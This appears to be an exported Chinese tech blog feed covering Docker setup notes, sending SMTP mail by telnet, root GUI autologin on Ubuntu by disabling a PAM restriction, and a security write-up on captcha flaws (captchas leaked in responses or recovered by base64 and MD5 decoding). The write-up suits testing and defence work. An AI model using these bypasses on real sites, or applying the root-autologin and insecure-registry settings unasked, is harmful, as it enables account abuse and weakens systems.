/etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"registry-mirrors"</span>: [ <span class="string">"你的仓库地址:端口"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-2-重启docker服务"><a href="#2-1-2-重启docker服务" class="headerlink" title="2.1.2 重启docker服务"></a>2.1.2 重启docker服务</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="2-2-为镜像打标签"><a href="#2-2-为镜像打标签" class="headerlink" title="2.2 为镜像打标签"></a>2.2 为镜像打标签</h2><p>命令说明</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">格式说明：Usage: docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG] :lastest </span><br><span class="line"></span><br><span class="line">docker tag centos7:latest 172.18.62.55:5000/centos7:v1</span><br><span class="line">// centos7:latest这是源镜像，也是刚才pull下来的镜像文件；</span><br><span class="line">// 172.18.62.55:5000/centos7:v1，这是目标镜像，也是registry私有镜像服务器的IP地址和端口；</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/20/mEuhSHAMsJ6e9yG.jpg" alt="tag标签.jpg"></p><h2 id="2-3-上传镜像到仓库"><a href="#2-3-上传镜像到仓库" class="headerlink" title="2.3 上传镜像到仓库"></a>2.3 上传镜像到仓库</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push 172.18.62.55:5000/centos7:v1</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The push refers to repository [172.18.62.55:5000/centos7:v1]</span><br><span class="line">Get https://172.18.62.55:5000/v2/: http: server gave HTTP response to HTTPS client</span><br></pre></td></tr></table></figure><p><strong>注意了，这是报错了</strong>，需要https的方法才能上传，我们可以修改下daemon.json来解决：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line">    <span class="attr">"registry-mirrors"</span>:[ <span class="string">"https://registry.docker-cn.com"</span>], </span><br><span class="line">    <span class="attr">"insecure-registries"</span>: [ <span class="string">"你的仓库地址:端口"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加私有镜像服务器的地址，注意书写格式为json，有严格的书写要求，然后重启docker服务：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>在次上传可以看到没问题 了：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker push 172.18.18.90:5000/centos7:v1</span><br><span class="line">The push refers to repository [172.18.18.90:5000/centos7]</span><br><span class="line">c5183829c43c: Pushed</span><br><span class="line">v1: digest: sha256:c7b0a24019b0e6eda714ec0fa137ad42bc44a754d9cea17d14fba3a80ccc1ee4 size: 527</span><br></pre></td></tr></table></figure><h2 id="2-4-下载镜像"><a href="#2-4-下载镜像" class="headerlink" title="2.4 下载镜像"></a>2.4 下载镜像</h2><p>以上传的centos7:v1的镜像为例，如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 172.18.18.90:5000/centos7:v1</span><br></pre></td></tr></table></figure><h2 id="2-5-其他信息"><a href="#2-5-其他信息" class="headerlink" title="2.5 其他信息"></a>2.5 其他信息</h2><h3 id="2-5-1-列出所有镜像"><a href="#2-5-1-列出所有镜像" class="headerlink" title="2.5.1 列出所有镜像"></a>2.5.1 列出所有镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.18.18.90:5000/v2/_catalog</span><br><span class="line"></span><br><span class="line">预期的结果例如：</span><br><span class="line">&#123;&quot;repositories&quot;:[&quot;centos7&quot;]&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-2-列出centos7镜像有哪些tag"><a href="#2-5-2-列出centos7镜像有哪些tag" class="headerlink" title="2.5.2 列出centos7镜像有哪些tag"></a>2.5.2 列出centos7镜像有哪些tag</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.18.18.90:5000/v2/busybox/tags/list</span><br><span class="line"></span><br><span class="line">预期的结果例如：</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"busybox"</span>,<span class="attr">"tags"</span>:[<span class="string">"v1"</span>]&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用telnet发送测试邮件</title>
      <link href="/2019/07/11/%E4%BD%BF%E7%94%A8Telnet%E5%8F%91%E9%80%81%E6%B5%8B%E8%AF%95%E9%82%AE%E4%BB%B6/"/>
      <url>/2019/07/11/%E4%BD%BF%E7%94%A8Telnet%E5%8F%91%E9%80%81%E6%B5%8B%E8%AF%95%E9%82%AE%E4%BB%B6/</url>
      <content type="html"><![CDATA[<h2 id="0x01-过程"><a href="#0x01-过程" class="headerlink" title="## 0x01 过程"></a>## 0x01 过程</h2><ul><li><p>telnet smtp.163.com 25<br>//注释：指定连接的邮箱服务器及端口号，mail默认port为25</p></li><li><p>helo localhost<br>// 注释：helo 向服务器发出标志自己身份的命令</p></li><li><p>auth login<br>// 注释： auth login 登录命令，依次输入base64编码后的用户名、密码</p></li><li><p>mail from:<a href="mailto:&#121;&#111;&#117;&#x72;&#109;&#x61;&#x69;&#108;&#110;&#97;&#x6d;&#101;&#64;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#109;" target="_blank" rel="noopener">&#121;&#111;&#117;&#x72;&#109;&#x61;&#x69;&#108;&#110;&#97;&#x6d;&#101;&#64;&#x31;&#x36;&#x33;&#46;&#99;&#111;&#109;</a><br>250 Mail OK // 注释：邮件发送者</p></li><li><p>rcpt to:<a href="mailto:&#x64;&#x73;&#x74;&#x6d;&#x61;&#105;&#x6c;&#x6e;&#x61;&#109;&#x65;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#111;&#x6d;" target="_blank" rel="noopener">&#x64;&#x73;&#x74;&#x6d;&#x61;&#105;&#x6c;&#x6e;&#x61;&#109;&#x65;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#111;&#x6d;</a><br>250 Mail OK // 注释：邮件接收者</p></li><li><p>data<br>// 注释：data命令开始书写邮件内容</p><p>to:<a href="mailto:dstmailname@163.com" target="_blank" rel="noopener">dstmailname@163.com</a> // 注释：收件人邮箱跟上文保持一致</p><p>from:<a href="mailto:yourmailname@163.com" target="_blank" rel="noopener">yourmailname@163.com</a> // 注释：发件人邮箱跟上文保持一致 这里好像不能造假了，测试了多次被退回</p><p>subject:test mail // 注释：邮件主体</p><p>//空一行</p><p>This is a test mail…. // 注释：正文内容</p><p>//空一行</p></li><li><p>.<br>// 注释：&lt;点&gt;+&lt;回车&gt; 正文内容结束标志</p></li></ul><p>250 Mail OK queued as smtp12,EMCowABnovABxQ1XZjKTAQ–.7259S2 1460520311</p><ul><li>quit<br>// 注释：退出</li></ul>]]></content>
      
      
        <tags>
            
            <tag> 邮件 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Docker 日常命令</title>
      <link href="/2019/07/08/Docker%E6%97%A5%E5%B8%B8%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/07/08/Docker%E6%97%A5%E5%B8%B8%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<h2 id="0x01-拷贝文件"><a href="#0x01-拷贝文件" class="headerlink" title="## 0x01 拷贝文件"></a>## 0x01 拷贝文件</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 容器到宿主机</span><br><span class="line">docker cp testtomcat：/usr/local/tomcat/webapps/test/js/test.js /opt</span><br><span class="line"></span><br><span class="line">* 宿主机到容器</span><br><span class="line">docker cp /opt/test.js testtomcat：/usr/local/tomcat/webapps/test/js</span><br></pre></td></tr></table></figure><h2 id="0x02-镜像-容器日常命令"><a href="#0x02-镜像-容器日常命令" class="headerlink" title="## 0x02 镜像/容器日常命令"></a>## 0x02 镜像/容器日常命令</h2><ul><li>查看本地所有镜像：docker images；</li><li>查看本地所有容器：docker ps -a / 查看本地所有运行中容器：docker ps；</li><li>拉取镜像：docker pull imageName:tag；</li><li>删除镜像：docker rmi imageId；</li><li>为镜像打标签：docker tag imageName username/repository:tag；</li><li>将镜像推送到镜像仓库：docker push username/repository:tag；</li><li>启动容器：docker start containerName/containerId；</li><li>进入容器：docker exec -it containerId /bin/bash；</li><li>关闭容器：docker stop containerId；</li><li>删除容器：docker rm containerId；</li><li>启动镜像：docker run [参数…] imageName:tag/imageId，常用参数如下：<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-d              //后台运行</span><br><span class="line">-it             //以交互的方式运行</span><br><span class="line">-p port1:port2  //将容器的port2端口映射到宿主机的port1端口</span><br><span class="line">-v dir1:dir2    //将宿主机的dir1目录挂载到容器的dir2目录下</span><br><span class="line">--name          //指定启动容器的名字</span><br><span class="line">-e[...]         //指定容器中的环境变量</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x03-导入-导出容器"><a href="#0x03-导入-导出容器" class="headerlink" title="## 0x03 导入/导出容器"></a>## 0x03 导入/导出容器</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* docker export $container_id &gt; 容器快照名</span><br><span class="line">如：docker export 02jg992hglshg9thg9 &gt; centos.tar</span><br><span class="line"></span><br><span class="line">* cat centos.tar | docker import - my/centos:v888</span><br></pre></td></tr></table></figure><h2 id="0x04-导入-导出镜像"><a href="#0x04-导入-导出镜像" class="headerlink" title="## 0x04 导入/导出镜像"></a>## 0x04 导入/导出镜像</h2><ul><li><p>镜像保存/载入：docker load/docker save；</p><p>将一个镜像导出为文件，再使用docker load命令将文件导入为一个镜像，会保存该镜像的的所有历史记录。比docker export命令导出的文件大，很好理解，因为会保存镜像的所有历史记录。</p></li></ul><ul><li><p>容器导入/导出：docker import/docker export；</p><p>将一个容器导出为文件，再使用docker import命令将容器导入成为一个新的镜像，但是相比docker save命令，容器文件会丢失所有元数据和历史记录，仅保存容器当时的状态，相当于虚拟机快照。</p></li></ul><h2 id="0x05-指定自动重启"><a href="#0x05-指定自动重启" class="headerlink" title="## 0x05 指定自动重启"></a>## 0x05 指定自动重启</h2><ul><li>docker run命令使用restart参数，如下：</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit --restart=always ******</span><br></pre></td></tr></table></figure><h2 id="0x06-映射多个端口"><a href="#0x06-映射多个端口" class="headerlink" title="## 0x06 映射多个端口"></a>## 0x06 映射多个端口</h2><ul><li>映射多个端口，在run新容器时，使用多个-p参数即可，如：</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit --name test -p 8888:80 -p 13306:3306 ubuntu:latest /bin/bash</span><br><span class="line">此命令即映射80端口和3306到宿主机的8888和13306端口</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ubuntu安装Docker &amp; Docker-compose</title>
      <link href="/2019/07/04/ubuntu%E5%AE%89%E8%A3%85Docker%20&amp;%20Docker-compose/"/>
      <url>/2019/07/04/ubuntu%E5%AE%89%E8%A3%85Docker%20&amp;%20Docker-compose/</url>
      <content type="html"><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="# 安装docker"></a># 安装docker</h1><h2 id="0x01-卸载已安装版本"><a href="#0x01-卸载已安装版本" class="headerlink" title="## 0x01 卸载已安装版本"></a>## 0x01 卸载已安装版本</h2><blockquote><p>sudo apt-get remove docker docker-engine docker.io</p></blockquote><h2 id="0x02-更新源"><a href="#0x02-更新源" class="headerlink" title="## 0x02 更新源"></a>## 0x02 更新源</h2><blockquote><p>apt-get update</p></blockquote><h2 id="0x03-安装依赖"><a href="#0x03-安装依赖" class="headerlink" title="## 0x03 安装依赖"></a>## 0x03 安装依赖</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><h2 id="0x04-添加官方密钥"><a href="#0x04-添加官方密钥" class="headerlink" title="## 0x04 添加官方密钥"></a>## 0x04 添加官方密钥</h2><blockquote><p>curl -fsSL <a href="https://download.docker.com/linux/ubuntu/gpg" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu/gpg</a> | sudo apt-key add -</p></blockquote><h2 id="0x05-添加仓库"><a href="#0x05-添加仓库" class="headerlink" title="## 0x05 添加仓库"></a>## 0x05 添加仓库</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</span><br></pre></td></tr></table></figure><h2 id="0x06-再次更新源"><a href="#0x06-再次更新源" class="headerlink" title="## 0x06 再次更新源"></a>## 0x06 再次更新源</h2><blockquote><p>apt-get update</p></blockquote><h2 id="0x07-安装docker"><a href="#0x07-安装docker" class="headerlink" title="## 0x07 安装docker"></a>## 0x07 安装docker</h2><blockquote><p>apt-get install docker-ce</p></blockquote><h2 id="0x08-查看版本"><a href="#0x08-查看版本" class="headerlink" title="## 0x08 查看版本"></a>## 0x08 查看版本</h2><blockquote><p>docker -v </p></blockquote><h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="# 安装docker-compose"></a># 安装docker-compose</h1><h2 id="0x01-安装脚本"><a href="#0x01-安装脚本" class="headerlink" title="## 0x01 安装脚本"></a>## 0x01 安装脚本</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.24.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="0x02-授权"><a href="#0x02-授权" class="headerlink" title="## 0x02 授权"></a>## 0x02 授权</h2><blockquote><p>sudo chmod +x /usr/local/bin/docker-compose</p></blockquote><h2 id="0x03-查看版本信息"><a href="#0x03-查看版本信息" class="headerlink" title="## 0x03 查看版本信息"></a>## 0x03 查看版本信息</h2><blockquote><p>docker-compose –version</p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ubuntu安装docker</title>
      <link href="/2019/07/04/Ubuntu%E5%AE%89%E8%A3%85Docker/"/>
      <url>/2019/07/04/Ubuntu%E5%AE%89%E8%A3%85Docker/</url>
      <content type="html"><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="# 安装docker"></a># 安装docker</h1><h2 id="0x01-卸载已安装版本"><a href="#0x01-卸载已安装版本" class="headerlink" title="## 0x01 卸载已安装版本"></a>## 0x01 卸载已安装版本</h2><blockquote><p>sudo apt-get remove docker docker-engine docker.io</p></blockquote><h2 id="0x02-更新源"><a href="#0x02-更新源" class="headerlink" title="## 0x02 更新源"></a>## 0x02 更新源</h2><blockquote><p>apt-get update</p></blockquote><h2 id="0x03-安装依赖"><a href="#0x03-安装依赖" class="headerlink" title="## 0x03 安装依赖"></a>## 0x03 安装依赖</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><h2 id="0x04-添加官方密钥"><a href="#0x04-添加官方密钥" class="headerlink" title="## 0x04 添加官方密钥"></a>## 0x04 添加官方密钥</h2><blockquote><p>curl -fsSL <a href="https://download.docker.com/linux/ubuntu/gpg" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu/gpg</a> | sudo apt-key add -</p></blockquote><h2 id="0x05-添加仓库"><a href="#0x05-添加仓库" class="headerlink" title="## 0x05 添加仓库"></a>## 0x05 添加仓库</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu   $(lsb_release -cs) stable"</span><br></pre></td></tr></table></figure><h2 id="0x06-再次更新源"><a href="#0x06-再次更新源" class="headerlink" title="## 0x06 再次更新源"></a>## 0x06 再次更新源</h2><blockquote><p>apt-get update</p></blockquote><h2 id="0x07-安装docker"><a href="#0x07-安装docker" class="headerlink" title="## 0x07 安装docker"></a>## 0x07 安装docker</h2><blockquote><p>apt-get install docker-ce</p></blockquote><h2 id="0x08-查看版本"><a href="#0x08-查看版本" class="headerlink" title="## 0x08 查看版本"></a>## 0x08 查看版本</h2><blockquote><p>docker -v </p></blockquote><h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="# 安装docker-compose"></a># 安装docker-compose</h1><h2 id="0x01-安装脚本"><a href="#0x01-安装脚本" class="headerlink" title="## 0x01 安装脚本"></a>## 0x01 安装脚本</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.24.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="0x02-授权"><a href="#0x02-授权" class="headerlink" title="## 0x02 授权"></a>## 0x02 授权</h2><blockquote><p>sudo chmod +x /usr/local/bin/docker-compose</p></blockquote><h2 id="0x03-查看版本信息"><a href="#0x03-查看版本信息" class="headerlink" title="## 0x03 查看版本信息"></a>## 0x03 查看版本信息</h2><blockquote><p>docker-compose –version</p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ubuntu18.04配置root用户界面登陆</title>
      <link href="/2019/07/03/ubuntu18.04%E9%85%8D%E7%BD%AEroot%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E7%99%BB%E9%99%86/"/>
      <url>/2019/07/03/ubuntu18.04%E9%85%8D%E7%BD%AEroot%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E7%99%BB%E9%99%86/</url>
      <content type="html"><![CDATA[<h2 id="1-修改配置文件"><a href="#1-修改配置文件" class="headerlink" title="1. 修改配置文件"></a>1. 修改配置文件</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf</span><br></pre></td></tr></table></figure><p>在最后一行添加greeter-show-manual-login=true</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">greeter-session=unity-greeter</span><br><span class="line">user-session=ubuntu</span><br><span class="line">greeter-show-manual-login=true</span><br><span class="line">allow-guest=false</span><br><span class="line">autologin-user=root</span><br><span class="line">autologin-user-timeout=0</span><br><span class="line">autologin-session=lightdm-autologin</span><br></pre></td></tr></table></figure><h2 id="2-Root用户添加密码"><a href="#2-Root用户添加密码" class="headerlink" title="2. Root用户添加密码"></a>2. Root用户添加密码</h2><h2 id="3-设置登陆错误"><a href="#3-设置登陆错误" class="headerlink" title="3. 设置登陆错误"></a>3. 设置登陆错误</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /root/.profile</span><br><span class="line"></span><br><span class="line">将最后一行修改为tty -s &amp;&amp; mesg n || true</span><br></pre></td></tr></table></figure><h2 id="4-添加必要的备注"><a href="#4-添加必要的备注" class="headerlink" title="4. 添加必要的备注"></a>4. 添加必要的备注</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/pam.d/gdm-autologin</span><br><span class="line"></span><br><span class="line">注释掉下面的内容</span><br><span class="line">auth requied pam_succeed_if.so user != root quiet success</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/pam.d/gdm-password</span><br><span class="line"></span><br><span class="line">注释掉下面的内容</span><br><span class="line">auth requied pam_succeed_if.so user != root quiet success</span><br></pre></td></tr></table></figure><h2 id="5-重启生效"><a href="#5-重启生效" class="headerlink" title="5. 重启生效"></a>5. 重启生效</h2>]]></content>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>逻辑让我崩溃之验证码姿势分享</title>
      <link href="/2019/03/27/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/27/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h2 id="0x00-日常BB"><a href="#0x00-日常BB" class="headerlink" title="## 0x00 日常BB"></a>## 0x00 日常BB</h2><p>文章首发是在<a href="https://xz.aliyun.com/t/4533" target="_blank" rel="noopener">先知社区-逻辑让我崩溃之验证码姿势分享</a></p><p>看论坛里大家平时发的技术文章，就知道自己是个还没踏进门槛的小学生，根本不在一个level，有点慌了。还是把自己平时发现的，自认为有点意思的点罗列出来，班门弄斧，师傅们别笑话→.→</p><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="## 0x01 前言"></a>## 0x01 前言</h2><p>本次分享的是自己关于自己遇到的一些关于图形验证码的案例，可能涉及图形验证码、短信验证码等，还是没有将问题探究到多深入，希望文中的思路能有所用。</p><h2 id="0x02-喂-你的那个验证码暴露了"><a href="#0x02-喂-你的那个验证码暴露了" class="headerlink" title="## 0x02 喂!你的那个验证码暴露了?"></a>## 0x02 喂!你的那个验证码暴露了?</h2><h3 id="案例前情"><a href="#案例前情" class="headerlink" title="### 案例前情"></a>### 案例前情</h3><p>有些开发人员在做图形验证码校验这一功能时，可能用到了类似这样的思路，所以出了问题,我不妨大胆臆想一下他们的“直男”逻辑，如下所示，那么问题就出在了验证的环节。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172616-b57c495e-4d4d-1.png" alt="0.png"><br>生成图形验证码之后，session中保存了四位验证码信息，通过GET请求获取图形验证码时，直接在验证码的末附上了session中的图形验证码值，用户传参后直接比较，同时也省去了提交之后校验的环节。</p><h3 id="案例分享"><a href="#案例分享" class="headerlink" title="### 案例分享"></a>### 案例分享</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172627-bc00019e-4d4d-1.png" alt="1.png"><br>登陆页面很直观的需要图形验证码，输入的信息均正确，就可以成功通过验证，进行登陆。那么，针对图形验证码的请求，有必要仔细瞅他一眼。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172637-c22d5a1c-4d4d-1.png" alt="4.png"><br>ok,在正常不过的一个请求，那瞅一眼返回信息看看，文末有彩蛋，json部分包括了captcha的值，那么字面意思可以是图形验证码的内容了，核实一下之后可以确信了。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172647-c82437a6-4d4d-1.png" alt="2.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172754-efa86180-4d4d-1.png" alt="!3.png"><br>所以这个点的问题很有可能基本上符合我上面的流程中对验证环节的臆想，剩下的就可以是绕过或者直接爆破了，因为图形验证码已经over time。</p><h2 id="0x03-喂-穿上马甲照样认识你！"><a href="#0x03-喂-穿上马甲照样认识你！" class="headerlink" title="## 0x03 喂!穿上马甲照样认识你！"></a>## 0x03 喂!穿上马甲照样认识你！</h2><h3 id="前情提要"><a href="#前情提要" class="headerlink" title="### 前情提要"></a>### 前情提要</h3><p>上一个案例涉及到了逻辑上存在问题的验证方式，同时很明显的展示了问题存在的点，这一部分没有明显的让你发现验证码的脆弱点，为了规避掉存在问题的点，自以为是用到了常见的拼凑、混淆方式。</p><h3 id="案例分享-1"><a href="#案例分享-1" class="headerlink" title="### 案例分享"></a>### 案例分享</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172807-f7f7c3da-4d4d-1.png" alt="1.png"></p><p>近乎同样的功能点，这个功能点试图使用图形验证码限制短信验证码的请求频率，那么也来看一下他的请求，是否可以从中get一些有用的信息。</p><p>PS:这个请求我们可以看到有一个参数<strong>_captcha_bankcoas_key=</strong>，这个值怎么看都像是用了base64编码，当然不排除是加密算法加密之后再次使用base64进行编码，尝试先进行base64解码看看如何，毕竟参数的定义方式已经告诉你：“这个参数和captcha有关”，来吧，试试看。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172821-ffc7d4e2-4d4d-1.png" alt="2.png"></p><p>返回包中的黄色箭头部分为密文形式，原密文如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZTI5ZTVhNjA4NWY0YjNjNDJhNDE0MjdkNzFjODQxMjUjMTU1MzA0OTI1OTQ3MSM2MDQ4MDAjTWprM1lqUTNNV0V3TjJZelpXRm1aVFUzWXpBeE5tRmxPR0kxTnpabE56ST0=</span><br></pre></td></tr></table></figure><p>首先进行一次base64解码，解码后的内容可以看出，好像这个串是通过一部分加密之后，再拼凑一部分再加密的方式，最后一个“#”号到结尾部分看起来就像是先base64的那部分，摘出来解解看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e29e5a6085f4b3c42a41427d71c84125#1553049259471#604800#Mjk3YjQ3MWEwN2YzZWFmZTU3YzAxNmFlOGI1NzZlNzI=</span><br></pre></td></tr></table></figure><p>最后一个“#”号到结尾的部分再次进行base64解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mjk3YjQ3MWEwN2YzZWFmZTU3YzAxNmFlOGI1NzZlNzI=</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172835-0854f4a0-4d4e-1.png" alt="3.png"></p><p>再次base64解码之后得到一个密文串儿，怎么看都得是32位md5加密值，图形验证码是6位纯数字，md5在线解密来看，<strong>嗯~真香</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">297b471a07f3eafe57c016ae8b576e72</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172844-0dbc0eba-4d4e-1.png" alt="4.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172858-15f326d6-4d4e-1.png" alt="5.png"></p><h2 id="0x04-喂-验证码我说了算"><a href="#0x04-喂-验证码我说了算" class="headerlink" title="## 0x04 喂!验证码我说了算?"></a>## 0x04 喂!验证码我说了算?</h2><h3 id="前情提要-1"><a href="#前情提要-1" class="headerlink" title="### 前情提要"></a>### 前情提要</h3><p>这个案例的与众不同点在于要求你输入红色标记的几个数字，这种验证方式一定程度上应该是很有效果的达到了验证码的作用，但是如果获取验证码的请求中有任何用户可控的数据提交，可能验证码就不是当年的验证码了。</p><h3 id="案例分享-2"><a href="#案例分享-2" class="headerlink" title="### 案例分享"></a>### 